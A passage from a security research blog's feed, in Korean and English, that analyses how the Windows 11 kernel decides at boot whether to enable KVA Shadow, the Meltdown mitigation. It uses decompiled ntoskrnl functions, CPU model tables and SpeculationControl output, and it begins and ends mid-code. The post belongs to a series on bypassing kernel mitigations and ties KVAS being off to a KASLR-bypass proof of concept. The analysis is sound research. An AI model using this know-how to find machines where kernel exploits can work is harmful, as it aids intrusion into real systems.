!(_DWORD)result )          <span class="hljs-keyword">return</span> result;        v12 = *(_WORD *)(KeGetPrcb(<span class="hljs-number">0</span>i64) + <span class="hljs-number">44714</span>);        a1-&gt;ShadowFlags |= <span class="hljs-number">2u</span>;        a1-&gt;VerwSelector = v12;      }      <span class="hljs-keyword">else</span>      {        LOBYTE(v6) = <span class="hljs-number">1</span>;        KiInitializeIdt(v7, v6);        KeGetCurrentThread()-&gt;ApcState.Process-&gt;AddressPolicy = <span class="hljs-number">1</span>;        byte_140FCE0E0 = <span class="hljs-number">1</span>;        _InterlockedOr(dword_140FCE57C, <span class="hljs-number">0x4000</span>u);        KiSetAddressPolicy(<span class="hljs-number">1</span>i64);        v8 = _bittest64((<span class="hljs-keyword">const</span> <span class="hljs-keyword">signed</span> __int64 *)&amp;a1-&gt;FeatureBits, <span class="hljs-number">0x2A</span>u);        a1-&gt;VerwSelector = <span class="hljs-number">24</span>;        <span class="hljs-keyword">if</span> ( v8 )        {          v9 = __readcr4();          __writecr4(v9 &amp; <span class="hljs-number">0xFFFFFFFFFFFDFF7F</span>ui64 | <span class="hljs-number">0x20000</span>);          v10 = __readcr3();          __writecr3(v10 | <span class="hljs-number">2</span>);          KiFlushPcid |= <span class="hljs-number">1u</span>;        }        <span class="hljs-keyword">if</span> ( (a1-&gt;FeatureBits &amp; <span class="hljs-number">0x240000000000</span>i64) == <span class="hljs-number">0x240000000000</span>i64 )          KiFlushPcid |= <span class="hljs-number">2u</span>;        HvlRescindEnlightenments();        KiKvaShadow = <span class="hljs-number">1</span>;        KiKvaShadowMode = <span class="hljs-number">2</span> - (KiFlushPcid != <span class="hljs-number">0</span>);      }      <span class="hljs-keyword">if</span> ( KiFlushPcid )        _interlockedbittestandset64((<span class="hljs-keyword">volatile</span> <span class="hljs-keyword">signed</span> __int32 *)&amp;a1-&gt;KernelDirectoryTableBase, <span class="hljs-number">0x3F</span>ui64);    }  }  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>i64;}</code></pre><ul><li><code>if ( KiKvaLeakage || KiKvaLeakageSimulate )</code>  &#xBD84;&#xAE30;<ul><li><code>KiDetectKvaLeakage</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC124;&#xC815;&#xD55C; &#xC804;&#xC5ED;&#xBCC0;&#xC218;<code>KiKvaLeakage</code></li><li>&#xC218;&#xB3D9; &#xC124;&#xC815;&#xAC12;(&#xB514;&#xBC84;&#xAE45; &#xBC0F; &#xD14C;&#xC2A4;&#xD2B8;&#xC6A9;)&#xC744; &#xD1B5;&#xD574; &#xACB0;&#xC815;&#xB418;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xCD94;&#xC815;&#xB418;&#xB294; &#xC804;&#xC5ED;&#xBCC0;&#xC218; <code>KiKvaLeakageSimulate</code></li></ul></li><li>&#xB450; &#xC804;&#xC5ED;&#xBCC0;&#xC218; &#xAC12; &#xC911; &#xD558;&#xB098;&#xB77C;&#xB3C4; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA74; KVAS&#xB97C; &#xD65C;&#xC131;&#xD654;</li></ul><h1 id="&#xC138;&#xC904;&#xC694;&#xC57D;"><a href="#&#xC138;&#xC904;&#xC694;&#xC57D;" class="headerlink" title="&#xC138;&#xC904;&#xC694;&#xC57D;"></a>&#xC138;&#xC904;&#xC694;&#xC57D;</h1><ul><li>Windows Kernel&#xC740; &#xCD08;&#xAE30;&#xD654; &#xC2DC; CPU&#xC5D0; &#xB530;&#xB77C; KVAS(&#xBC0F; &#xB2E4;&#xB978; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158;)&#xC744; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xD65C;&#xC131;&#xD654;&#xD568;.</li><li>KVAS &#xD65C;&#xC131;&#xD654; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;&#xD558;&#xB294; &#xAE30;&#xC900;&#xC740; &#xD06C;&#xAC8C; &#xB450; &#xAC00;&#xC9C0;<ul><li>Intel: Rogue Data Cache Load(Meltdown)</li><li>AMD: Branch Confusion</li></ul></li><li>CPU&#xAC00; MSR&#xC744; &#xD1B5;&#xD574; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158; &#xC801;&#xC6A9; &#xC5EC;&#xBD80;&#xB97C; &#xD655;&#xC778;&#xD558;&#xACE0;, MSR &#xAE30;&#xB2A5;&#xC774; &#xC5C6;&#xC73C;&#xBA74; &#xB808;&#xAC70;&#xC2DC; &#xCCB4;&#xD06C; (bitmask, &#xBAA8;&#xB378;&#xB118;&#xBC84; &#xC815;&#xBCF4; &#xB4F1;)&#xB97C; &#xD1B5;&#xD574; KVAS &#xD65C;&#xC131;&#xD654; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;&#xD568;.</li></ul><h1 id="&#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xBA70;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xBA70;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xBA70;"></a>&#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xBA70;</h1><p><img src="/2025/08/10/l0ch/deep-dive-into-kva/ko/image1.jpg" alt="Untitled"></p><p>&#xC0AC;&#xC2E4; &#xC608;&#xC804;&#xC5D0; &#xD55C;&#xCC3D; &#xCD94;&#xCE21; &#xC2E4;&#xD589; &#xAE30;&#xBC18;&#xC758; &#xC0AC;&#xC774;&#xB4DC;&#xCC44;&#xB110; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC774;&#xC288;&#xB420; &#xB54C; &#xAD6D;&#xBC29;&#xC758; &#xC758;&#xBB34;&#xB97C; &#xC218;&#xD589;&#xD558;&#xB290;&#xB77C; &#xC81C;&#xB300;&#xB85C; &#xD30C;&#xBCF4;&#xC9C8; &#xBABB;&#xD588;&#xB294;&#xB370;&#xC694;, &#xC800;&#xBC88; KASLR bypass&#xC640; &#xC774;&#xBC88; &#xAE00;&#xC744; &#xC791;&#xC131;&#xD558;&#xBA74;&#xC11C; &#xC790;&#xC138;&#xD788; &#xD30C;&#xBCFC; &#xAE30;&#xD68C;&#xAC00; &#xB41C; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACFC;&#xAC70;&#xC758; &#xC774;&#xC288;&#xB97C; &#xC81C;&#xB300;&#xB85C; &#xD30C;&#xC545;&#xD558;&#xB294; &#xAC8C; &#xD604;&#xC7AC;&#xC758; &#xD2B8;&#xB80C;&#xB4DC;&#xB97C; &#xB530;&#xB77C;&#xAC00;&#xB294; &#xAC83; &#xB9CC;&#xD07C;&#xC774;&#xB098; &#xC911;&#xC694;&#xD558;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xB2E4;&#xC2DC; &#xD55C; &#xBC88; &#xB290;&#xB07C;&#xBA74;&#xC11C;,  <del>&#xC774;&#xC81C; Windows Internals &#xC644;&#xB3C5;&#xC744; &#xB2E4;&#xC2DC; &#xC2DC;&#xB3C4;&#xD558;&#xB294; &#xAC78;&#xB85C;..</del></p><p>&#xB2E4;&#xC74C;&#xC5D0;&#xB3C4; &#xC7AC;&#xBC0C;&#xB294; &#xC5F0;&#xAD6C; &#xC8FC;&#xC81C; &#xB4E4;&#xACE0; &#xC624;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;~</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://support.microsoft.com/en-us/topic/kb4073119-windows-client-guidance-for-it-pros-to-protect-against-silicon-based-microarchitectural-and-speculative-execution-side-channel-vulnerabilities-35820a8a-ae13-1299-88cc-357f104f5b11">https://support.microsoft.com/en-us/topic/kb4073119-windows-client-guidance-for-it-pros-to-protect-against-silicon-based-microarchitectural-and-speculative-execution-side-channel-vulnerabilities-35820a8a-ae13-1299-88cc-357f104f5b11</a></p><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-23825">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-23825</a></p><p><a href="https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/cpuid-enumeration-and-architectural-msrs.html">https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/cpuid-enumeration-and-architectural-msrs.html</a></p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/amd64_x/cpu_vendors.htm">https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/amd64_x/cpu_vendors.htm</a></p><p><a href="https://support.microsoft.com/en-us/topic/kb4074629-understanding-speculationcontrol-powershell-script-output-fd70a80a-a63f-e539-cda5-5be4c9e67c04">https://support.microsoft.com/en-us/topic/kb4074629-understanding-speculationcontrol-powershell-script-output-fd70a80a-a63f-e539-cda5-5be4c9e67c04</a></p><p><a href="https://www.intel.com/content/www/us/en/content-details/782158/intel-64-and-ia-32-architectures-software-developer-s-manual-combined-volumes-1-2a-2b-2c-2d-3a-3b-3c-3d-and-4.html">https://www.intel.com/content/www/us/en/content-details/782158/intel-64-and-ia-32-architectures-software-developer-s-manual-combined-volumes-1-2a-2b-2c-2d-3a-3b-3c-3d-and-4.html</a></p><p><a href="https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_KPRCB">https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_KPRCB</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/mitigation/">mitigation</category>
      
      <category domain="https://hackyboiz.github.io/tags/exploit-techniques/">exploit techniques</category>
      
      <category domain="https://hackyboiz.github.io/tags/KVAS/">KVAS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/10/l0ch/deep-dive-into-kva/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Deep Dive into KVA Shadow&#39;s Dynamic Activation Mechanism(En)</title>
      <link>https://hackyboiz.github.io/2025/08/10/l0ch/deep-dive-into-kva/en/</link>
      <guid>https://hackyboiz.github.io/2025/08/10/l0ch/deep-dive-into-kva/en/</guid>
      <pubDate>Sun, 10 Aug 2025 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello, this is L0ch!  It&amp;#x2019;s been a while since my last post.&lt;/p&gt;
&lt;p&gt;Last week&amp;#x2019;s topic was &lt;a href=&quot;https://hackyboiz.github.</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello, this is L0ch!  It&#x2019;s been a while since my last post.</p><p>Last week&#x2019;s topic was <a href="https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/ko/">[Research] Bypassing Windows Kernel Mitigations: Part 0 - Deep Dive into KASLR Leaks Restriction</a>. I mentioned that one of the conditions for the KASLR bypass PoC to work is that KVA Shadow is disabled!</p><p>At the time of writing, I had assumed that KVAS was disabled by default in the latest Windows 11, but through feedback, I learned that KVAS is dynamically activated based on CPU model and specific vulnerabilities, rather than Windows version.</p><h1 id="SpeculationControl-PowerShell-script"><a href="#SpeculationControl-PowerShell-script" class="headerlink" title="SpeculationControl PowerShell script"></a><strong>SpeculationControl PowerShell script</strong></h1><p>KVAS is closely related to various speculative execution-based side-channel vulnerabilities, such as Meltdown and Spectre, so you can easily check the relevant MS support information.</p><p><a href="https://support.microsoft.com/en-us/topic/kb4074629-understanding-speculationcontrol-powershell-script-output-fd70a80a-a63f-e539-cda5-5be4c9e67c04">https://support.microsoft.com/en-us/topic/kb4074629-understanding-speculationcontrol-powershell-script-output-fd70a80a-a63f-e539-cda5-5be4c9e67c04</a></p><p>The results of testing on my computer with a 12th generation Intel CPU are summarized as follows.</p><pre><code class="hljs powershell"><span class="hljs-comment"># Windwos 11 24H2 - Intel 12th i7-12700</span><span class="hljs-built_in">PS</span> C:\WINDOWS\system32&gt; <span class="hljs-built_in">Install-Module</span> <span class="hljs-literal">-Name</span> SpeculationControl                                                                                                                                                                                 need a NuGet provider to <span class="hljs-keyword">continue</span>.<span class="hljs-built_in">PS</span> C:\WINDOWS\system32&gt; <span class="hljs-built_in">Get-SpeculationControlSettings</span>BTIHardwarePresent                  : TrueBTIWindowsSupportPresent            : TrueBTIWindowsSupportEnabled            : TrueBTIDisabledBySystemPolicy           : FalseBTIDisabledByNoHardwareSupport      : FalseBTIKernelRetpolineEnabled           : FalseBTIKernelImportOptimizationEnabled  : TrueRdclHardwareProtectedReported       : TrueRdclHardwareProtected               : TrueKVAShadowRequired                   : FalseKVAShadowWindowsSupportPresent      : TrueKVAShadowWindowsSupportEnabled      : FalseKVAShadowPcidEnabled                : FalseSSBDWindowsSupportPresent           : TrueSSBDHardwareVulnerable              : TrueSSBDHardwarePresent                 : TrueSSBDWindowsSupportEnabledSystemWide : FalseL1TFHardwareVulnerable              : FalseL1TFWindowsSupportPresent           : TrueL1TFWindowsSupportEnabled           : FalseL1TFInvalidPteBit                   : <span class="hljs-number">0</span>L1DFlushSupported                   : TrueHvL1tfStatusAvailable               : TrueHvL1tfProcessorNotAffected          : TrueMDSWindowsSupportPresent            : TrueMDSHardwareVulnerable               : FalseMDSWindowsSupportEnabled            : FalseFBClearWindowsSupportPresent        : TrueSBDRSSDPHardwareVulnerable          : FalseFBSDPHardwareVulnerable             : FalsePSDPHardwareVulnerable              : FalseFBClearWindowsSupportEnabled        : False</code></pre><div class="table-container"><table><thead><tr><th>Hardware requires kernel VA shadowing</th><th>Maps to KVAShadowRequired. This line tells you whether your system requires kernel VA shadowing to mitigate a vulnerability.</th></tr></thead><tbody><tr><td>Windows OS support for rogue data cache load mitigation is present</td><td>Maps to KVAShadowWindowsSupportPresent. This line tells you whether Windows operating system support for the kernel VA shadow feature is present.</td></tr><tr><td>Windows OS support for kernel VA shadow is present</td><td>Maps to KVAShadowWindowsSupportPresent. This line tells you whether Windows operating system support for the kernel VA shadow feature is present. If it is True, the January 2018 update is installed on the device, and kernel VA shadow is supported. If it is False, the January 2018 update is not installed, and kernel VA shadow support does not exist.</td></tr><tr><td>Windows OS support for rogue data cache load mitigation is enabled</td><td>Maps to KVAShadowWindowsSupportEnabled. This line tells you whether the kernel VA shadow feature is enabled. If it is True, the hardware is believed to be vulnerable to CVE-2017-5754, Windows operating system support is present, and the feature is enabled.</td></tr><tr><td>Windows OS support for kernel VA shadow is enabled</td><td>Maps to KVAShadowWindowsSupportEnabled. This line tells you whether the kernel VA shadow feature is enabled. If it is True, Windows operating system support is present, and the feature is enabled. The Kernel VA shadow feature is currently enabled by default on client versions of Windows and is disabled by default on versions of Windows Server. If it is False, either Windows operating system support is not present, or the feature is not enabled.</td></tr></tbody></table></div><pre><code class="hljs cpp">Although the KVA Shadow feature exists in Windows,(KVAShadowWindowsSupportPresent: True) it is <span class="hljs-keyword">not</span> necessary.(KVAShadowRequired: False) <span class="hljs-function">so <span class="hljs-keyword">not</span> <span class="hljs-title">activated</span><span class="hljs-params">(KVAShadowWindowsSupportEnabled: False)</span></span></code></pre><p>We can see that KVAS is disabled, which means that although the mitigation feature exists, <strong>the hardware (CPU) is not vulnerable, so the mitigation feature is disabled</strong>.</p><p>So where and how does Windows identify vulnerable CPUs and determine whether to enable KVAS?</p><h1 id="Background-Knowledge-CPU-Identification"><a href="#Background-Knowledge-CPU-Identification" class="headerlink" title="Background Knowledge - CPU Identification"></a>Background Knowledge - CPU Identification</h1><p>Windows identifies the CPU vendor on its own. As defined in the <a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/amd64_x/cpu_vendors.htm">CPU_VENDORS</a> Enum, unknown manufacturers are defined as 0, AMD as 1, and Intel as 2.</p><pre><code class="hljs jsx">typedef enum{    CPU_UNKNOWN,   <span class="hljs-comment">// 0</span>    CPU_AMD,       <span class="hljs-comment">// 1</span>    CPU_INTEL,     <span class="hljs-comment">// 2</span>    CPU_VIA        <span class="hljs-comment">// 3</span>} CPU_VENDORS;</code></pre><p>CPU information such as vendor, Faily ID, and Model ID is stored in the <a href="https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_KPRCB">KPRCB</a> structure. </p><p>These IDs are defined by each CPU vendor. In the case of Intel, the Family ID, Model ID, and generation information for Intel CPU products are defined in the <a href="https://www.intel.com/content/www/us/en/content-details/782158/">Intel Developer Manual</a>. Since it&#x2019;s not feasible to review the entire 5,000-page manual, I used gemini to summarize the information in the table below.</p><div class="table-container"><table><thead><tr><th><strong>MircoArchitecture(gen)</strong></th><th>Processor family</th><th><strong>Family ID (Hex)</strong></th><th><strong>Model ID (Hex)</strong></th></tr></thead><tbody><tr><td>Raptor Lake (13 gen)</td><td>Intel Core</td><td>06H</td><td>B7H, BFH</td></tr><tr><td>Alder Lake (12 gen)</td><td>Intel Core</td><td>06H</td><td>97H, 9AH</td></tr><tr><td>Tiger Lake (11 gen)</td><td>Intel Core</td><td>06H</td><td>8CH, 8DH</td></tr><tr><td>Rocket Lake (11 gen)</td><td>Intel Core</td><td>06H</td><td>A7H</td></tr><tr><td>Ice Lake (10 gen)</td><td>Intel Core</td><td>06H</td><td>7DH, 7EH</td></tr><tr><td>Comet Lake (10 gen)</td><td>Intel Core</td><td>06H</td><td>A5H, A6H</td></tr><tr><td>Amber Lake Y (8 gen)</td><td>Intel Core</td><td>06H</td><td>8EH</td></tr><tr><td>Whiskey Lake U (8 gen)</td><td>Intel Core</td><td>06H</td><td>8EH</td></tr><tr><td>Coffee Lake (8, 9 gen)</td><td>Intel Core</td><td>06H</td><td>9EH</td></tr><tr><td>Kaby Lake (7 gen)</td><td>Intel Core</td><td>06H</td><td>8EH, 9EH</td></tr><tr><td>Skylake (6 gen)</td><td>Intel Core</td><td>06H</td><td>4EH, 5EH, 55H</td></tr><tr><td>Broadwell (5 gen)</td><td>Intel Core</td><td>06H</td><td>3DH, 47H, 4FH</td></tr><tr><td>Haswell (4 gen)</td><td>Intel Core</td><td>06H</td><td>3CH, 45H, 46H, 3FH</td></tr><tr><td>Ivy Bridge (3 gen)</td><td>Intel Core</td><td>06H</td><td>3AH</td></tr><tr><td>Sandy Bridge (2 gen)</td><td>Intel Core</td><td>06H</td><td>2AH</td></tr><tr><td>Westmere (2010)</td><td>Intel Core</td><td>06H</td><td>25H, 2CH, 2FH</td></tr><tr><td>Nehalem (1 gen)</td><td>Intel Core</td><td>06H</td><td>1AH, 1EH, 1FH, 2EH</td></tr><tr><td>Penryn</td><td>Core 2 Duo/Quad</td><td>06H</td><td>17H, 1DH</td></tr><tr><td>Merom</td><td>Core 2 Duo</td><td>06H</td><td>0FH</td></tr><tr><td>Yonah</td><td>Core Duo/Solo</td><td>06H</td><td>0EH</td></tr></tbody></table></div><p>I also organized and analyzed the ID lists of AMD and other vendors.</p><h1 id="Analysis-of-KVAS-Activation-Logic"><a href="#Analysis-of-KVAS-Activation-Logic" class="headerlink" title="Analysis of KVAS Activation Logic"></a>Analysis of KVAS Activation Logic</h1><p>Analysis Environment: Windows 24H2 64-bit 10.0.26100.1742</p><p>Returning to the topic at hand, in order to analyze the mitigation initialization logic, we need to examine the part of the Windows boot process that initializes the kernel. </p><p>The entry point of the Windows kernel image <code>ntoskrnl.exe</code> is <code>KiSystemStartup</code>, which performs various tasks such as CPU initialization, mitigation-related feature settings, and kernel debugger initialization.</p><p>The function that determines whether KVAS is enabled was surprisingly easy to find.</p><ul><li>KiSystemStartup &#x2192; KiInitializeBootStructures &#x2192; KiSetFeatureBits &#x2192; KiDetectKvaLeakage</li></ul><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS __stdcall __noreturn <span class="hljs-title">KiSystemStartup</span><span class="hljs-params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">//...</span>  KeLoaderBlock_0 = (__int64)DriverObject;  <span class="hljs-keyword">if</span> ( !*((_DWORD *)DriverObject-&gt;MajorFunction[<span class="hljs-number">3</span>] + <span class="hljs-number">9</span>) )    KasanInitSystem(DriverObject, <span class="hljs-number">0</span>i64);  <span class="hljs-keyword">if</span> ( !*(_DWORD *)(*(_QWORD *)(KeLoaderBlock_0 + <span class="hljs-number">136</span>) + <span class="hljs-number">36</span>i64) )    KdInitSystem(<span class="hljs-number">0xFFFFFFFF</span>i64, KeLoaderBlock_0);  v2 = *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> **)(KeLoaderBlock_0 + <span class="hljs-number">136</span>);<span class="hljs-comment">//...</span>  KiInitializeBootStructures(KeLoaderBlock_0);  <span class="hljs-comment">// Initialize Boot Structures</span>  <span class="hljs-keyword">if</span> ( !*MK_FP(<span class="hljs-number">43</span>, *MK_FP(<span class="hljs-number">43</span>, KeLoaderBlock_0 + <span class="hljs-number">136</span>) + <span class="hljs-number">36</span>i64) )    KdInitSystem(<span class="hljs-number">0</span>i64, KeLoaderBlock_0);<span class="hljs-comment">//...</span>}<span class="hljs-function">__int64 __fastcall <span class="hljs-title">KiInitializeBootStructures</span><span class="hljs-params">(__int64 a1)</span></span><span class="hljs-function"></span>{  KPCR *Pcr; <span class="hljs-comment">// r14</span>  _KPROCESS **v2; <span class="hljs-comment">// rbx</span>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">KPRCB</span> *<span class="hljs-title">CurrentPrcb</span>;</span> <span class="hljs-comment">// rdi</span><span class="hljs-comment">//...</span>  <span class="hljs-keyword">if</span> ( !KeGetPcr()-&gt;Prcb.Number )    KiInitializeNxSupportDiscard(v19, v18, v20);  HalInitializeProcessor(Number, a1, v20);  KiSetFeatureBits(CurrentPrcb);                <span class="hljs-comment">// Set Prcb Feature Bits</span>  CurrentPCB_Number = CurrentPrcb-&gt;Number;  v27 = KiSystemCall32;  v28 = KiSystemCall64;  <span class="hljs-keyword">if</span> ( !CurrentPCB_Number )  {    KiEnableKvaShadowing(CurrentPrcb);              <span class="hljs-comment">//  Decide whether to enable KVA Shadow</span>    CurrentPCB_Number = CurrentPrcb-&gt;Number;  }  <span class="hljs-keyword">if</span> ( KiKvaShadow )                             <span class="hljs-comment">// When the KVA Shadow flag is enabled</span>  {    v27 = KiSystemCall32Shadow;                 <span class="hljs-comment">// instead of KiSystemCall32/KiSystemCall64  </span>    v28 = KiSystemCall64Shadow;                 <span class="hljs-comment">// use KiSystemCall32Shadow/KiSystemCall64Shadow</span>  }  <span class="hljs-comment">//...</span>}<span class="hljs-function">__int64 __fastcall <span class="hljs-title">KiSetFeatureBits</span><span class="hljs-params">(_KPRCB *CurrentPRCB)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">char</span> CpuType; <span class="hljs-comment">// bl</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> CpuModel; <span class="hljs-comment">// ecx</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuVendor; <span class="hljs-comment">// dl</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ProcessorSignature; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuStepping; <span class="hljs-comment">// cl</span>  <span class="hljs-keyword">unsigned</span> __int8 v57; <span class="hljs-comment">// al</span>  <span class="hljs-keyword">unsigned</span> __int64 v58; <span class="hljs-comment">// rcx</span><span class="hljs-comment">//...</span>  CpuType = CurrentPRCB-&gt;CpuType_Family;        <span class="hljs-comment">// CpuType = Processor Family</span>  CpuModel = CurrentPRCB-&gt;CpuModel;  CpuVendor = CurrentPRCB-&gt;CpuVendor;  v123 = (CpuVendor - <span class="hljs-number">1</span>) &lt;= <span class="hljs-number">1u</span>;  <span class="hljs-keyword">if</span> ( CurrentPRCB-&gt;Number )  {    ProcessorSignature = KiGetProcessorSignature(<span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64);    KiSetProcessorSignature(CurrentPRCB, ProcessorSignature);    <span class="hljs-keyword">goto</span> LABEL_40;  }<span class="hljs-comment">//... </span>  KiDetectKvaLeakage(CurrentPRCB);      <span class="hljs-comment">// Detect - KVA needs to be activated</span>  _m_prefetchw(CurrentPRCB);  <span class="hljs-keyword">if</span> ( CurrentPRCB-&gt;CpuVendor == <span class="hljs-number">1</span> )  {    v52 |= <span class="hljs-number">0x100000</span>u;    HIDWORD(v134) = v52;  }<span class="hljs-comment">//...</span>}</code></pre><h2 id="KVAS-Activation-for-Meltdown"><a href="#KVAS-Activation-for-Meltdown" class="headerlink" title="KVAS Activation for Meltdown"></a>KVAS Activation for Meltdown</h2><p>In the above call chain, the <code>KiDetectKvaLeakage</code> function is the core function that determines whether KVA is enabled.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> __fastcall <span class="hljs-title">KiDetectKvaLeakage</span><span class="hljs-params">(_KPRCB *a1)</span></span><span class="hljs-function"></span>{  __int64 p_CpuVendor; <span class="hljs-comment">// rsi</span>  <span class="hljs-keyword">unsigned</span> __int64 _RAX; <span class="hljs-comment">// rax</span>  __int64 v4; <span class="hljs-comment">// rcx</span>  __int64 _RAX; <span class="hljs-comment">// rax</span>  __int64 _RAX; <span class="hljs-comment">// rax</span>  __int64 _RDX; <span class="hljs-comment">// rdx</span>  <span class="hljs-keyword">unsigned</span> __int64 v13; <span class="hljs-comment">// rdx</span>  <span class="hljs-keyword">bool</span> v14; <span class="hljs-comment">// zf</span>  <span class="hljs-keyword">int</span> *v15; <span class="hljs-comment">// rdx</span>  <span class="hljs-keyword">int</span> v16; <span class="hljs-comment">// ecx</span>  __int64 v17; <span class="hljs-comment">// rbx</span>  __int64 _RAX; <span class="hljs-comment">// rax</span>  __int64 _RAX; <span class="hljs-comment">// rax</span>  __int64 _RAX; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> Number; <span class="hljs-comment">// edx</span>  <span class="hljs-keyword">int</span> v29[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-20h] BYREF</span>  v29[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;  p_CpuVendor = &amp;a1-&gt;CpuVendor;    <span class="hljs-comment">// Check 1</span>  LODWORD(_RAX) = KiIsKvaShadowNeededForBranchConfusion(a1);  <span class="hljs-keyword">if</span> ( _RAX )    <span class="hljs-keyword">goto</span> ENABLE_KVAS_BRANCH_CONFUSION;  LODWORD(_RAX) = *p_CpuVendor;    <span class="hljs-comment">// Check 2</span>  <span class="hljs-comment">// Intel - Check with bitmask</span>  <span class="hljs-keyword">if</span> ( *p_CpuVendor == <span class="hljs-number">2</span> )  {    _RAX = a1-&gt;CpuModel;    <span class="hljs-keyword">if</span> ( a1-&gt;CpuType == <span class="hljs-number">6</span> &amp;&amp; _RAX &lt;= <span class="hljs-number">0x36</span>u )    {      v4 = <span class="hljs-number">0x6000C010000000</span>i64;      <span class="hljs-keyword">if</span> ( _bittest64(&amp;v4, _RAX) )        <span class="hljs-keyword">return</span> _RAX;    }  }  <span class="hljs-comment">// Others - disable KVAS</span>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( _RAX != <span class="hljs-number">3</span> || a1-&gt;CpuType == <span class="hljs-number">6</span> &amp;&amp; a1-&gt;CpuModel == <span class="hljs-number">13</span>)  {    <span class="hljs-keyword">return</span> _RAX;  }<span class="hljs-comment">// Check 3</span><span class="hljs-comment">// IA32_ARCH_CAPABILITIES support query</span>  _RAX = <span class="hljs-number">0</span>i64;  __asm { cpuid }  <span class="hljs-keyword">if</span> ( _RAX &lt; <span class="hljs-number">7</span> )    <span class="hljs-keyword">goto</span> ENABLE_KVAS;  _RAX = <span class="hljs-number">7</span>i64;  __asm { cpuid }  <span class="hljs-keyword">if</span> ( (_RDX &amp; <span class="hljs-number">0x20000000</span>) == <span class="hljs-number">0</span> )    <span class="hljs-keyword">goto</span> ENABLE_KVAS;<span class="hljs-comment">// Check 3</span><span class="hljs-comment">// msr address 0x10A - IA32_ARCH_CAPABILITIES</span>  _RAX = __readmsr(<span class="hljs-number">0x10A</span>u);  <span class="hljs-comment">//IA32_ARCH_CAPABILITIES bit 0 : RDCL_NO</span>  <span class="hljs-keyword">if</span> ( (_RAX &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )    <span class="hljs-keyword">goto</span> ENABLE_KVAS;   KiMicrocodeTrackerEnabled = <span class="hljs-number">1</span>;  LODWORD(_RAX) = <span class="hljs-number">3670016</span>;  LOBYTE(v13) = (KeFeatureBits2 &amp; <span class="hljs-number">0x28</span>) == <span class="hljs-number">8</span>;  <span class="hljs-keyword">if</span> ( (KeFeatureBits2 &amp; <span class="hljs-number">0x380000</span>) != <span class="hljs-number">3670016</span> )  {    LODWORD(_RAX) = KiIsFbClearSupported(KeFeatureBits2 &amp; <span class="hljs-number">0x380000</span>, v13);    LOBYTE(v13) = _RAX | v13;  }  <span class="hljs-keyword">if</span> ( v13 )  {ENABLE_KVAS:    <span class="hljs-keyword">if</span> ( a1-&gt;Number &amp;&amp; !KiKvaLeakage )      KeBugCheckEx(<span class="hljs-number">0x5D</span>u, <span class="hljs-number">0x4B56414C</span>ui64, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64);ENABLE_KVAS_BRANCH_CONFUSION:    v14 = *p_CpuVendor == <span 